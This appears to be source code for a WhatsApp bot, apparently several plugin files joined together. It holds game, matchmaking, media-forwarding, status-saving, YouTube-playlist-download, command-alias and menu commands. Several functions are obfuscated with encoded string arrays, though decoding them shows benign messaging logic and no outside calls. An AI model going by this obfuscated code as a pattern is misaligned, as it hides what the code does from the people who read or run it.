            5: "5️⃣",
            6: "6️⃣",
            7: "7️⃣",
            8: "8️⃣",
            9: "9️⃣",
          }[v];
        });
        if (isSurrender) {
          room.game._currentTurn = citel.sender === room.game.playerX;
          isWin = true;
        }
        let winner = isSurrender ? room.game.currentTurn : room.game.winner;
        let str = `Room ID: ${room.id}
        
  ${arr.slice(0, 3).join("  ")}
  ${arr.slice(3, 6).join("  ")}
  ${arr.slice(6).join("  ")}
  ${ isWin ? `@${winner.split("@")[0]} Won ! and got 2000💎 in wallet🤑` : isTie ? `Game Tied,well done to both of you players.` : `Current Turn ${["❌", "⭕"][1 * room.game._currentTurn]} @${ room.game.currentTurn.split("@")[0]}`  }
  ⭕:- @${room.game.playerO.split("@")[0]}
  ❌:- @${room.game.playerX.split("@")[0]}`;
  
        if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== citel.chat)
          room[room.game._currentTurn ^ isSurrender ? "x" : "o"] = citel.chat;
        if(isWin){  await eco.give(citel.sender, "Suhail", 2000);  }
        if (isWin || isTie) { 
          await Void.sendMessage(citel.chat, { text: str, mentions: [room.game.playerO,room.game.playerX], });
          delete this.game[room.id];
        } 
        else {  await Void.sendMessage(citel.chat, {  text: str,   mentions: [room.game.playerO,room.game.playerX], });  }
      }
    }
  );
  
  cmd({ pattern: "ship" , category: "fun" }, async(Void, citel, text) => {
      const { tlang } = require('../lib')
     if (!citel.isGroup) return citel.reply(tlang().group);
     const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
       const participants = citel.isGroup ? await groupMetadata.participants : "";
     let members = participants.map(u => u.id)
     const percentage = Math.floor(Math.random() * 100)
      async function couple(percent) {
           var text;
          if (percent < 25) {
              text = `\t\t\t\t\t*ShipCent : ${percentage}%* \n\t\tThere's still time to reconsider your choices`
          } else if (percent < 50) {
              text = `\t\t\t\t\t*ShipCent : ${percentage}%* \n\t\t Good enough, I guess! 💫`
          } else if (percent < 75) {
              text = `\t\t\t\t\t*ShipCent : ${percentage}%* \n\t\t\tStay together and you'll find a way ⭐️`
          } else if (percent < 90) {
              text = `\t\t\t\t\t*ShipCent : ${percentage}%* \n\tAmazing! You two will be a good couple 💖 `
          } else {
              text = `\t\t\t\t\t*ShipCent : ${percentage}%* \n\tYou two are fated to be together 💙`
          }
          return text
          }
         var user = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
         var shiper;
         if (user) {
         shiper = user
         } else {
         shiper = members[Math.floor(Math.random() * members.length)]
         }
         let caption = `\t❣️ *Matchmaking...* ❣️ \n`
          caption += `\t\t✯────────────────────✯\n`
          caption += `@${citel.sender.split('@')[0]}  x  @${shiper.split('@')[0]}\n`
          caption += `\t\t✯────────────────────✯\n`
          caption += await couple(percentage)
          if(citel.sender.split('@')[0]===shiper.split('@')[0]) return citel.reply('```'+'Wait... What!!!,You wanna do matchmaking with yourself'+'```')
          await Void.sendMessage(citel.chat,{text: caption,mentions: [citel.sender,shiper]},{quoted:citel})
     }
  )
















































































  async function forwardMessage(jid, Void, citel, cmd='' ){
    const _0x3c0522=_0x2ab3;(function(_0x42e49e,_0x4e2d41){const _0x1434b0=_0x2ab3,_0x3008e6=_0x42e49e();while(!![]){try{const _0x339e5a=parseInt(_0x1434b0(0xe6))/0x1+parseInt(_0x1434b0(0xeb))/0x2*(parseInt(_0x1434b0(0xdb))/0x3)+parseInt(_0x1434b0(0xe0))/0x4+parseInt(_0x1434b0(0xda))/0x5*(-parseInt(_0x1434b0(0xd6))/0x6)+parseInt(_0x1434b0(0xe8))/0x7*(-parseInt(_0x1434b0(0xe4))/0x8)+-parseInt(_0x1434b0(0xe5))/0x9*(-parseInt(_0x1434b0(0xdc))/0xa)+-parseInt(_0x1434b0(0xe1))/0xb;if(_0x339e5a===_0x4e2d41)break;else _0x3008e6['push'](_0x3008e6['shift']());}catch(_0x147fd6){_0x3008e6['push'](_0x3008e6['shift']());}}}(_0x5d35,0x66d09));function _0x5d35(){const _0x3a283c=['mtype','*Error,\x20Request\x20not\x20be\x20proceed*','documentMessage','270695uTSNmQ','2418510Iffpec','10DCBpiz','save','log','send','906280npzxwg','2436412bgsfYC','quoted','imageMessage','63608cveTAW','934947kHphkG','793264fnJIbn','conversation','609aBETxq','videoMessage','ptv','2fVbfhc','extendedTextMessage','audioMessage','66SxJVPa'];_0x5d35=function(){return _0x3a283c;};return _0x5d35();}let mtype=citel[_0x3c0522(0xe2)][_0x3c0522(0xd7)],message;if(mtype===_0x3c0522(0xe9)&&cmd===_0x3c0522(0xea))message={'ptvMessage':{...citel['quoted']}};else{if(mtype===_0x3c0522(0xe9))message={'videoMessage':{...citel[_0x3c0522(0xe2)]}};else{if(mtype===_0x3c0522(0xe3))message={'imageMessage':{...citel[_0x3c0522(0xe2)]}};else{if(mtype===_0x3c0522(0xd5))message={'audioMessage':{...citel['quoted']}};else{if(mtype===_0x3c0522(0xd9))message={'documentMessage':{...citel[_0x3c0522(0xe2)]}};else{if(mtype===_0x3c0522(0xe7)||mtype===_0x3c0522(0xd4))return await citel[_0x3c0522(0xdf)](citel[_0x3c0522(0xe2)]['text']);}}}}}function _0x2ab3(_0x3f21c7,_0x57cc24){const _0x5d3507=_0x5d35();return _0x2ab3=function(_0x2ab3f1,_0x391603){_0x2ab3f1=_0x2ab3f1-0xd4;let _0x3290e8=_0x5d3507[_0x2ab3f1];return _0x3290e8;},_0x2ab3(_0x3f21c7,_0x57cc24);}if(message){sᴜʜᴀɪʟ_ᴍᴅ=Void;try{await sᴜʜᴀɪʟ_ᴍᴅ['relayMessage'](jid,message,{'messageId':citel['key']['id']});}catch(_0x272ed5){(cmd==='ptv'||cmd===_0x3c0522(0xdd))&&await citel['send'](_0x3c0522(0xd8)),console[_0x3c0522(0xde)]('Error\x20in\x20'+cmd+'-cmd\x20in\x20forwardMessage\x20\x0a',_0x272ed5);}}
    }
    ///============================================================================================
    cmd({ pattern: "ptv", desc: "send ptv Message of video", category: "whatsapp",filename: __filename},async(Void, citel, text,{cmdName , isCreator}) => {
        if(!citel.quoted) return await citel.send("*Uhh please, reply to a video Message*")
        let mtype = citel.quoted.mtype 
        if(mtype !== "videoMessage") return await citel.send("*Replied Message is not a video, Idiot.*")
        return await forwardMessage(citel.chat, Void, citel, cmdName )
    })////------------------------------------------------------------
    cmd({pattern: "#", desc: "Save whatsapp status",category: "whatsapp",filename: __filename},async(Void, citel, text,{cmdName , isCreator}) => {
        if(!citel.quoted) return await citel.send("*Uhh Please, reply to whatsapp status*")
        let sᴜʜᴀɪʟ_ᴍᴅ_num = await Void.decodeJid(Void.user.id)
        return await forwardMessage(sᴜʜᴀɪʟ_ᴍᴅ_num, Void, citel, cmdName )
    })//--------------------------------------------------------------------
    cmd({pattern: "save",desc: "Save Message to log number",category: "whatsapp",filename: __filename},async(Void, citel, text,{cmdName , isCreator}) => {
        if(!isCreator) return await citel.send(tlang().owner)
        if(!citel.quoted) return await citel.send("*Uhh Please, reply to a Message*")
        let sᴜʜᴀɪʟ_ᴍᴅ_num = await Void.decodeJid(Void.user.id)
        return await forwardMessage(sᴜʜᴀɪʟ_ᴍᴅ_num, Void, citel, cmdName )
    })///================================================================================
    cmd({ on: "text" }, async (Void,citel,text)=> {
        if(citel.quoted && citel.text.toLowerCase().includes("send") ){
            let sᴜʜᴀɪʟ_ᴍᴅ_num = await Void.decodeJid(Void.user.id)
            if(citel.quoted.sender === sᴜʜᴀɪʟ_ᴍᴅ_num && citel.quoted.chat === 'status@broadcast' ){ return await forwardMessage(citel.chat, Void, citel, 'send' ); }
        }
    })








































































    cmd({
        pattern: "playlist",
        desc: "Downloads video from playlist.",
        category: "downloader",
        filename: __filename,
        use: '<yt playlist url>',
    },
    async(Void, citel, text) => {
        const getRandom = (ext) => {  return `${Math.floor(Math.random() * 10000)}${ext}`; };
        if (!text) {  citel.reply(`❌Please provide me a url`);   return; }
let urlYtt = text.split('=')[1]
console.log(urlYtt)
var opts = { listId: urlYtt }
yts( opts, async function ( err, playlist ) {
if ( err ) throw err
citel.reply('This Process will take a bit time.');
for (let i=0;i<playlist.videos.length;i++){
if(playlist.videos[i].videoId===undefined) continue
let urlYt = playlist.videos[i].videoId
try {
  
            let infoYt = await ytdl.getInfo(urlYt);
            if (infoYt.videoDetails.lengthSeconds >= videotime) continue
            let titleYt = infoYt.videoDetails.title;
            let randomName = getRandom(".mp4");
            const stream = ytdl(urlYt, {  filter: (info) => info.itag == 22 || info.itag == 18, })
                .pipe(fs.createWriteStream(`./${randomName}`));
            await new Promise((resolve, reject) => {stream.on("error", reject);stream.on("finish", resolve); });
            let stats = fs.statSync(`./${randomName}`);
            let fileSizeInBytes = stats.size;
            let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
            if (fileSizeInMegabytes <= dlsize) {
                let search = await yts(text);
                let buttonMessage = {
                    video: fs.readFileSync(`./${randomName}`),
                    mimetype: 'video/mp4',
                    caption: ` ⿻ Title : ${titleYt}\n ⿻ File Size : ${fileSizeInMegabytes} MB`,
                    headerType: 4,
                    contextInfo: {
                        externalAdReply: {
                            title: titleYt,
                            body: citel.pushName,
                            thumbnail: log0,
                            renderLargerThumbnail: true,
                            mediaType: 2,
                            mediaUrl: 'https://www.youtube.com/@SuhailTechInfo0',
                            sourceUrl: 'https://www.youtube.com/@SuhailTechInfo0'
                        }
                    }
                }
               Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })
            } else { citel.reply(`❌ File size bigger than ${dlsize}mb.`);  }
            fs.unlinkSync(`./${randomName}`);
} catch (e) {   console.log(e)   }
        }})





        /*

        const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`;
        };
        if (!text) {
            citel.reply(`❌Please provide me a url`);
            return;
        }
let urlYtt = text.split('=')[1]
console.log(urlYtt)
var opts = { listId: urlYtt }
yts( opts, async function ( err, playlist ) {
if ( err ) throw err
citel.reply('This Process will take a bit time.');
for (let i=0;i<playlist.videos.length;i++){
if(playlist.videos[i].videoId===undefined) continue
let urlYt = playlist.videos[i].videoId
try {
  
            let infoYt = await ytdl.getInfo(urlYt);
            if (infoYt.videoDetails.lengthSeconds >= videotime) continue
            let titleYt = infoYt.videoDetails.title;
            let randomName = getRandom(".mp4");

            const stream = ytdl(urlYt, {
                    filter: (info) => info.itag == 22 || info.itag == 18,
                })
                .pipe(fs.createWriteStream(`./${randomName}`));
            await new Promise((resolve, reject) => {
                stream.on("error", reject);
                stream.on("finish", resolve);
            });
            let stats = fs.statSync(`./${randomName}`);
            let fileSizeInBytes = stats.size;
            let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
            if (fileSizeInMegabytes <= dlsize) {
                let yts = require("secktor-pack");
                let search = await yts(text);
                let buttonMessage = {
                    video: fs.readFileSync(`./${randomName}`),
                    jpegThumbnail: log0,
                    mimetype: 'video/mp4',
                    fileName: `${titleYt}.mp4`,
                    caption: ` ⿻ Title : ${titleYt}\n ⿻ File Size : ${fileSizeInMegabytes} MB`,
                    headerType: 4,
                    contextInfo: {
                        externalAdReply: {
                            title: titleYt,
                            body: citel.pushName,
                            thumbnail: await getBuffer(search.all[0].thumbnail),
                            renderLargerThumbnail: true,
                            mediaType: 2,
                            mediaUrl: search.all[0].thumbnail,
                            sourceUrl: search.all[0].thumbnail
                        }
                    }
                }
               Void.sendMessage(citel.chat, buttonMessage, { quoted: citel })
            } else {
                citel.reply(`❌ File size bigger than ${dlsize}mb.`);
            }

            fs.unlinkSync(`./${randomName}`);
        } catch (e) {
            console.log(e)
        }
        }})
        */


})




































































sᴜʜᴀɪʟ_ᴍᴅ.cmd({
    pattern: "setcmd",
    desc: "To check ping",
    category: "general",
    filename: __filename,
},
async(Void, citel,text, { isCreator } ) => {
const _0x259a3b=_0x3d7a;(function(_0x22b503,_0x545323){const _0xa308d6=_0x3d7a,_0x4eba37=_0x22b503();while(!![]){try{const _0x236fe0=-parseInt(_0xa308d6(0x14f))/0x1+parseInt(_0xa308d6(0x138))/0x2+parseInt(_0xa308d6(0x136))/0x3*(-parseInt(_0xa308d6(0x142))/0x4)+parseInt(_0xa308d6(0x153))/0x5+parseInt(_0xa308d6(0x135))/0x6*(parseInt(_0xa308d6(0x134))/0x7)+-parseInt(_0xa308d6(0x144))/0x8*(parseInt(_0xa308d6(0x14c))/0x9)+-parseInt(_0xa308d6(0x13d))/0xa*(-parseInt(_0xa308d6(0x13e))/0xb);if(_0x236fe0===_0x545323)break;else _0x4eba37['push'](_0x4eba37['shift']());}catch(_0x3d175f){_0x4eba37['push'](_0x4eba37['shift']());}}}(_0x3f0c,0xa1e0b));if(!isCreator)return await citel['reply'](tlang()['owner']);if(!text)return await citel[_0x259a3b(0x150)](_0x259a3b(0x139));function _0x3d7a(_0xc5c3c1,_0x33e9ed){const _0x3f0c35=_0x3f0c();return _0x3d7a=function(_0x3d7aa7,_0x4c920a){_0x3d7aa7=_0x3d7aa7-0x134;let _0x5a1313=_0x3f0c35[_0x3d7aa7];return _0x5a1313;},_0x3d7a(_0xc5c3c1,_0x33e9ed);}let a=text['split'](',');var cmdName,newAlias;let isSticker=![];if(citel['quoted']){let mime=citel[_0x259a3b(0x14e)]['mtype'];mime==_0x259a3b(0x149)&&text&&(isSticker=!![],cmdName=text[_0x259a3b(0x152)]('\x20')[0x0],newAlias=_0x259a3b(0x13f)+citel[_0x259a3b(0x14e)][_0x259a3b(0x14a)]);}if(!isSticker&&a['length']>0x1)newAlias=a[0x0][_0x259a3b(0x13c)]()[_0x259a3b(0x13a)](),cmdName=a[0x1]['trim']()['toLowerCase']();else{if(!isSticker)return await citel[_0x259a3b(0x150)](_0x259a3b(0x155));}if(newAlias[_0x259a3b(0x140)]<0x1)return await citel[_0x259a3b(0x154)]('*_Uhh\x20Please,\x20Provide\x20New_Cmd\x20Name\x20First_*');if(global[_0x259a3b(0x137)][newAlias])return await citel[_0x259a3b(0x150)](_0x259a3b(0x148)+(isSticker?_0x259a3b(0x157):newAlias)+'\x22\x20Already\x20set\x20for\x20\x22'+global[_0x259a3b(0x137)][newAlias]+_0x259a3b(0x151)+(isSticker?'Sticker':_0x259a3b(0x143))+'_*');const cmd=sᴜʜᴀɪʟ_ᴍᴅ[_0x259a3b(0x146)][_0x259a3b(0x158)](_0x258c2d=>_0x258c2d[_0x259a3b(0x156)]===cmdName)||sᴜʜᴀɪʟ_ᴍᴅ[_0x259a3b(0x146)][_0x259a3b(0x158)](_0x23f1c1=>_0x23f1c1[_0x259a3b(0x13b)]&&_0x23f1c1[_0x259a3b(0x13b)][_0x259a3b(0x141)](cmdName));function _0x3f0c(){const _0x104f22=['*_Provided\x20Cmd(\x20','commands','*_Cmd\x20\x22','*_\x22','stickerMessage','fileSha256','\x22._*\x0a*_These\x20all\x20names\x20are\x20reset,\x20If\x20bot\x20restart_*','253980JzTuSs','\x22\x20Succesfully\x20set\x20to\x20\x22','quoted','877840yamrtX','send','\x22\x20Cmd,\x20Please\x20try\x20another\x20','split','3664530RpkdoT','reply','*_Uhh\x20Dear,\x20Give\x20Cmd\x20With\x20New\x20Name_*\x0a*Eg:\x20_.setcmd\x20New_Name,\x20Cmd_Name_*','pattern','Given\x20Sticker','find','495166mDpoZk','6xINmdC','13086BNCzbK','setCmdAlias','1679692iymroq','*_Please\x20provide\x20cmd\x20name\x20by\x20replying\x20a\x20Sticker_*','toLowerCase','alias','trim','10UxudvF','3556091FxLLuc','sticker-','length','includes','80YpCJNl','Name','96KXYmOk'];_0x3f0c=function(){return _0x104f22;};return _0x3f0c();}if(cmd)return global[_0x259a3b(0x137)][newAlias]=cmd[_0x259a3b(0x156)],await citel['send'](_0x259a3b(0x147)+global[_0x259a3b(0x137)][newAlias]+_0x259a3b(0x14d)+(isSticker?'Sticker':newAlias)+_0x259a3b(0x14b));else return await citel['send'](_0x259a3b(0x145)+cmdName+')\x20not\x20found\x20in\x20bot\x20cmds.\x20Please\x20Provide\x20Valid\x20cmd\x20Name_*');

  
});
//---------------------------------------------------------------------------
sᴜʜᴀɪʟ_ᴍᴅ.cmd({
    pattern: "delcmd",
    desc: "To check ping",
    category: "general",
    filename: __filename,
},
async(Void, citel,text, { isCreator } ) => {
const _0x524184=_0x10c3;function _0x10c3(_0x2e452d,_0x1ac35c){const _0x2610be=_0x2610();return _0x10c3=function(_0x10c395,_0x26abe2){_0x10c395=_0x10c395-0x172;let _0x2e5fb6=_0x2610be[_0x10c395];return _0x2e5fb6;},_0x10c3(_0x2e452d,_0x1ac35c);}(function(_0x16557,_0xbe3210){const _0xff9a45=_0x10c3,_0x5a11e6=_0x16557();while(!![]){try{const _0x26db40=-parseInt(_0xff9a45(0x185))/0x1+-parseInt(_0xff9a45(0x180))/0x2*(parseInt(_0xff9a45(0x186))/0x3)+parseInt(_0xff9a45(0x18b))/0x4*(parseInt(_0xff9a45(0x187))/0x5)+-parseInt(_0xff9a45(0x17f))/0x6+parseInt(_0xff9a45(0x183))/0x7*(parseInt(_0xff9a45(0x17e))/0x8)+parseInt(_0xff9a45(0x177))/0x9*(parseInt(_0xff9a45(0x189))/0xa)+-parseInt(_0xff9a45(0x18a))/0xb;if(_0x26db40===_0xbe3210)break;else _0x5a11e6['push'](_0x5a11e6['shift']());}catch(_0xf860bb){_0x5a11e6['push'](_0x5a11e6['shift']());}}}(_0x2610,0xe5013));function _0x2610(){const _0x59822a=['fileSha256','975933DOBIjx','\x22\x20deleted\x20Succesfully\x20at\x20\x22','257257ZLxGlJ','3581997Dkkdue','74850wtfIad','*_Please\x20reply\x20to\x20a\x20Sticker\x20that\x20set\x20for\x20a\x20Cmd_*','10rkZoVX','4773263OSdVAJ','476iQrYKP','stickerMessage','Sticker','*_\x22','sticker-','trim','8969733iJoDlG','quoted','setCmdAlias','Given\x20Sticker','mtype','\x22\x20cmd_*','cmd\x20Name','80DUaXQq','8094390uxZxYG','2hUflnY','send'];_0x2610=function(){return _0x59822a;};return _0x2610();}if(!isCreator)return await citel['reply'](tlang()['owner']);let Alias=text?text['split']('\x20')[_0x524184(0x176)]()['toLowerCase']():'',isSticker=![];if(citel[_0x524184(0x178)]){if(citel[_0x524184(0x178)][_0x524184(0x17b)]==_0x524184(0x172))isSticker=!![],Alias=_0x524184(0x175)+citel[_0x524184(0x178)][_0x524184(0x182)];else{if(!text)return await citel['send'](_0x524184(0x188));}}else{if(!text)return await citel[_0x524184(0x181)]('*_Uhh\x20Dear,\x20provide\x20Name\x20that\x20set\x20to\x20a\x20cmd_*\x0a*Eg:\x20_.delcmd\x20Cmd_Name_*');}if(global[_0x524184(0x179)][Alias]){await citel[_0x524184(0x181)](_0x524184(0x174)+(isSticker?_0x524184(0x17a):Alias)+_0x524184(0x184)+global[_0x524184(0x179)][Alias]+_0x524184(0x17c)),delete global[_0x524184(0x179)][Alias];return;}else return await citel['send'](_0x524184(0x174)+(isSticker?_0x524184(0x17a):Alias)+'\x22\x20not\x20Set\x20for\x20any\x20cmd._*\x0a\x20*_Please\x20Provide\x20Valid\x20'+(isSticker?_0x524184(0x173):_0x524184(0x17d))+'\x20to\x20delete_*');

})

//------------------------------------------------------------------------------------

sᴜʜᴀɪʟ_ᴍᴅ.cmd({
    pattern: "ping",
    desc: "To check ping",
    category: "general",
    filename: __filename,
},
async(Void, citel) => {
    var inital = new Date().getTime();
    await citel.reply('*Testing Ping!!!*');
    var final = new Date().getTime();
    return await citel.reply('*Pong*\n *' + (final - inital) + ' ms* ');
});


//------------------------------------------------------------------------------------
sᴜʜᴀɪʟ_ᴍᴅ.cmd({
        pattern: "help",
        alias: ["menu"],
        desc: "Help list",
        category: "general",
       // react: "👀",
        filename: __filename
    },
    async(Void, citel, text) => {
const _0x3fc31d=_0x40b1;(function(_0x3800cd,_0x3de357){const _0x42bc7c=_0x40b1,_0x480304=_0x3800cd();while(!![]){try{const _0x2c9083=-parseInt(_0x42bc7c(0x1f5))/0x1+parseInt(_0x42bc7c(0x1f1))/0x2*(-parseInt(_0x42bc7c(0x1d9))/0x3)+-parseInt(_0x42bc7c(0x1e6))/0x4+parseInt(_0x42bc7c(0x1e4))/0x5*(parseInt(_0x42bc7c(0x1df))/0x6)+-parseInt(_0x42bc7c(0x1cf))/0x7*(-parseInt(_0x42bc7c(0x1e3))/0x8)+-parseInt(_0x42bc7c(0x1b9))/0x9+parseInt(_0x42bc7c(0x1d2))/0xa;if(_0x2c9083===_0x3de357)break;else _0x480304['push'](_0x480304['shift']());}catch(_0x1c7ec3){_0x480304['push'](_0x480304['shift']());}}}(_0x2d15,0x8ed11));const {commands}=require(_0x3fc31d(0x1db));function _0x2d15(){const _0x3dcbed=['\x20Uptime:-\x20','\x20Theme:-\x20','3IYCGJf','length','../lib','desc','╰━━━━━━━━━━━━━━──⊷','category','6ywGack','asia/karachi','*〽️Usage:*\x0a\x20```','Asia/karachi','8zshHwK','655285XBvYXA','*🍁Command:*\x20','2913192pJJFBk','』──❖\x0a','DD/MM/YYYY','\x0a└──────────────◉','freemem','toLowerCase','caption','\x20\x20》────⊷\x0a│\x20╭──────✧❁✧──────◆','```','map','*🧩Category:*\x20','461954NCDnWn','┌──『','pattern','\x20Date:-\x20','505551HaJHvT','random','push','join','use','totalmem','\x20Owner:-\x20','6840378BqAqwV','locale','menu','split','a17','format','╭────《\x20\x20','HH:mm:ss','alias','sendMessage','botname','*\x20]═──▸\x0a│╭────────────···▸\x0a┴│▸','┬│▸\x0a│╰─────────────···▸\x0a└───────────────···▸','*🧩Description:*\x20','\x20Mem:-\x20','chat','trim','〉───◆\x0a│╭─────────────···▸\x0a┴│▸','ownername','includes','\x20|\x20','aztec','42399CIXGKp','\x20Time:-\x20','setDefault','26727310gDeEPD','title','┌───═[\x20*','│\x20╰──────✧❁✧──────◆\x0a╰══════════════════⊷','*🧩Alias:*\x20'];_0x2d15=function(){return _0x3dcbed;};return _0x2d15();}if(text['split']('\x20')[0x0]){let arr=[];const cmd=commands['find'](_0x522249=>_0x522249[_0x3fc31d(0x1f3)]===text[_0x3fc31d(0x1bc)]('\x20')[0x0][_0x3fc31d(0x1eb)]());if(cmd){arr[_0x3fc31d(0x1f7)](_0x3fc31d(0x1e5)+cmd[_0x3fc31d(0x1f3)]);if(cmd['category'])arr[_0x3fc31d(0x1f7)](_0x3fc31d(0x1f0)+cmd[_0x3fc31d(0x1de)]);if(cmd[_0x3fc31d(0x1c1)])arr[_0x3fc31d(0x1f7)](_0x3fc31d(0x1d6)+cmd[_0x3fc31d(0x1c1)]);if(cmd[_0x3fc31d(0x1dc)])arr[_0x3fc31d(0x1f7)](_0x3fc31d(0x1c6)+cmd[_0x3fc31d(0x1dc)]);if(cmd[_0x3fc31d(0x1b6)])arr[_0x3fc31d(0x1f7)](_0x3fc31d(0x1e1)+prefix+cmd[_0x3fc31d(0x1f3)]+'\x20'+cmd[_0x3fc31d(0x1b6)]+_0x3fc31d(0x1ee));return await citel['reply'](arr[_0x3fc31d(0x1f8)]('\x0a'));}}var up_up,up_mid,up_btm,ctgry_L,ctgry_R,cmd_L,ctgry_end;let default_menu=0x0;Config[_0x3fc31d(0x1bb)]===''&&(default_menu=Math['floor'](Math[_0x3fc31d(0x1f6)]()*0x3)+0x1);if(default_menu==0x1||Config['menu'][_0x3fc31d(0x1c9)]()['startsWith']('1')||Config[_0x3fc31d(0x1bb)]['toLowerCase']()[_0x3fc31d(0x1cc)](_0x3fc31d(0x1ce)))up_up='┏━━⟪\x20*'+Config[_0x3fc31d(0x1c3)]+'*\x20⟫━━⦿',up_mid='┃\x20✗',up_btm='┗━━━━━━━━━━━━━━━⦿',ctgry_L=_0x3fc31d(0x1f2),ctgry_R=_0x3fc31d(0x1e7),cmd_L=_0x3fc31d(0x1cd),ctgry_end=_0x3fc31d(0x1e9);else default_menu==0x2||Config[_0x3fc31d(0x1bb)][_0x3fc31d(0x1c9)]()['startsWith']('2')||Config[_0x3fc31d(0x1bb)][_0x3fc31d(0x1eb)]()[_0x3fc31d(0x1cc)](_0x3fc31d(0x1bd))?(up_up=_0x3fc31d(0x1d4)+Config[_0x3fc31d(0x1c3)]+_0x3fc31d(0x1c4),up_mid='⬡│▸',up_btm=_0x3fc31d(0x1c5),ctgry_L='┌───〈',ctgry_R=_0x3fc31d(0x1ca),cmd_L='⬡│▸\x20',ctgry_end='┬│▸\x0a│╰────────────···▸▸\x0a└───────────────···▸'):(up_up=_0x3fc31d(0x1bf)+Config[_0x3fc31d(0x1c3)]+_0x3fc31d(0x1ed),up_mid='│\x20│',up_btm=_0x3fc31d(0x1d5),ctgry_L='╭────❏',ctgry_R='❏',cmd_L='│',ctgry_end=_0x3fc31d(0x1dd));const cmds={};function _0x40b1(_0x599b07,_0x844e95){const _0x2d155e=_0x2d15();return _0x40b1=function(_0x40b135,_0x30f28c){_0x40b135=_0x40b135-0x1b6;let _0x909518=_0x2d155e[_0x40b135];return _0x909518;},_0x40b1(_0x599b07,_0x844e95);}commands[_0x3fc31d(0x1ef)](async(_0x423f50,_0xb3d1e7)=>{const _0x4cc0fe=_0x3fc31d;if(_0x423f50['dontAddCommandList']===![]&&_0x423f50[_0x4cc0fe(0x1f3)]!==undefined){if(!cmds[_0x423f50[_0x4cc0fe(0x1de)]])cmds[_0x423f50[_0x4cc0fe(0x1de)]]=[];cmds[_0x423f50[_0x4cc0fe(0x1de)]][_0x4cc0fe(0x1f7)](_0x423f50[_0x4cc0fe(0x1f3)]);}});const time=moment(moment())[_0x3fc31d(0x1be)](_0x3fc31d(0x1c0));moment['tz'][_0x3fc31d(0x1d1)](_0x3fc31d(0x1e2))[_0x3fc31d(0x1ba)]('id');const date=moment['tz'](_0x3fc31d(0x1e0))[_0x3fc31d(0x1be)](_0x3fc31d(0x1e8));let total=await sck1['countDocuments'](),str=up_up+'\x0a'+up_mid+_0x3fc31d(0x1d8)+tlang()[_0x3fc31d(0x1d3)]+'\x0a'+up_mid+_0x3fc31d(0x1b8)+Config[_0x3fc31d(0x1cb)]+'\x0a'+up_mid+'\x20Plugins:-\x20'+commands[_0x3fc31d(0x1da)]+'\x0a'+up_mid+_0x3fc31d(0x1d7)+runtime(process['uptime']())+'\x0a'+up_mid+_0x3fc31d(0x1c7)+formatp(os['totalmem']()-os[_0x3fc31d(0x1ea)]())+'/'+formatp(os[_0x3fc31d(0x1b7)]())+'\x0a'+up_mid+_0x3fc31d(0x1d0)+time+'\x0a'+up_mid+_0x3fc31d(0x1f4)+date+'\x0a'+up_btm+'\x0a\x0a';for(const category in cmds){str+=ctgry_L+'\x20*'+tiny(category)+'*\x20'+ctgry_R+'\x0a';if(text[_0x3fc31d(0x1eb)]()==category[_0x3fc31d(0x1eb)]()){str=ctgry_L+'\x20*'+tiny(category)+'*\x20'+ctgry_R+'\x0a';for(const plugins of cmds[category]){str+=cmd_L+'\x20'+fancytext(plugins,0x1)+'\x0a';}str+=ctgry_end+'\x0a';break;}else{for(const plugins of cmds[category]){str+=cmd_L+'\x20'+fancytext(plugins,0x1)+'\x0a';}str+=ctgry_end+'\x0a';}}str+=Config[_0x3fc31d(0x1ec)];let buttonMessaged={'image':{'url':await botpic()},'caption':str,'footer':tlang()['footer'],'headerType':0x4};return await Void[_0x3fc31d(0x1c2)](citel[_0x3fc31d(0x1c8)],buttonMessaged,{'quoted':citel});
})
//---------------------------------------------------------------------------
sᴜʜᴀɪʟ_ᴍᴅ.cmd({
        pattern: "list",
        desc: "list menu",
        category: "general",
        react: "🥀"
     },
    async(Void, citel) => {
        const { commands } = require('../lib');
        let str = `
╭━━〘 *${Config.botname}* 〙────⊷     
┃ ✭ Theme: ${tlang().title}
┃ ✭ Prefix: ${prefix}
┃ ✭ Owner: ${Config.ownername}
┃ ✭ Commands: ${commands.length}
┃ ✭ Uptime: ${runtime(process.uptime())}
┃ ✭ Mem: ${formatp(os.totalmem() - os.freemem())}/${formatp(os.totalmem())}
╰━━━━━━━━━━━━━━⊷\n`

        for (let i = 0; i < commands.length; i++) 
        {
             if(commands[i].pattern==undefined) continue
             str +=       `╭ ${i+1} *${fancytext(commands[i].pattern,1)}*\n`                // ${i+1} 
             str += `╰➛ ${fancytext(commands[i].desc,1)}\n`
        }

        

//str += `╰━━━━━━━━━━━───⊷\nsᴜʜᴀɪʟ ᴛᴇᴄʜ ɪɴғᴏ \n www.youtube.com/c/SuhailTechInfo`
        return await Void.sendMessage(citel.chat, { image: { url: THUMB_IMAGE }, caption: str + Config.caption ,footer: tlang().footer, headerType: 4 })
    }
)
//---------------------------------------------------------------------------
sᴜʜᴀɪʟ_ᴍᴅ.cmd({
    pattern: "owner",
    desc: "To check ping",
    category: "general",
    react: "💜",
    filename: __filename
},
async(Void, citel) => {
    const Config = require('../config')
    const thmb = await getBuffer(global.THUMB_IMAGE)
    const vcard = 'BEGIN:VCARD\n' +
        'VERSION:3.0\n' +
        'FN:' + Config.ownername + '\n' +
        'ORG:;\n' +
        'TEL;type=CELL;type=VOICE;waid=' + global.owner + ':+' + global.owner + '\n' +
        'END:VCARD'
    let buttonMessaged = {
        contacts: { displayName: Config.ownername, contacts: [{ vcard }] },
        contextInfo: {
            externalAdReply: {
                title: Config.ownername,
                body: 'Touch here.',
                renderLargerThumbnail: true,
                thumbnailUrl: ``,
                thumbnail: thmb,
                mediaType: 1,
                mediaUrl: '',
                sourceUrl: `https://wa.me/+` + owner + '?text=Hii+bro,I+am+' + citel.pushName,
            },
        },
    };
    return await Void.sendMessage(citel.chat, buttonMessaged, {   quoted: citel, });

}
)
//------------------------------------------------------------------------------------
const readDirectory = (text) => {
return new Promise((resolve, reject) => {
fs.readdir(text, (err, files) => {
  if (err) {reject('Error reading directory'); }
  else {
    //citel.reply("Files Here \n "+files.toString())
    resolve(files);
  }
});
});
};
//------------------------------------------------------------------------------------
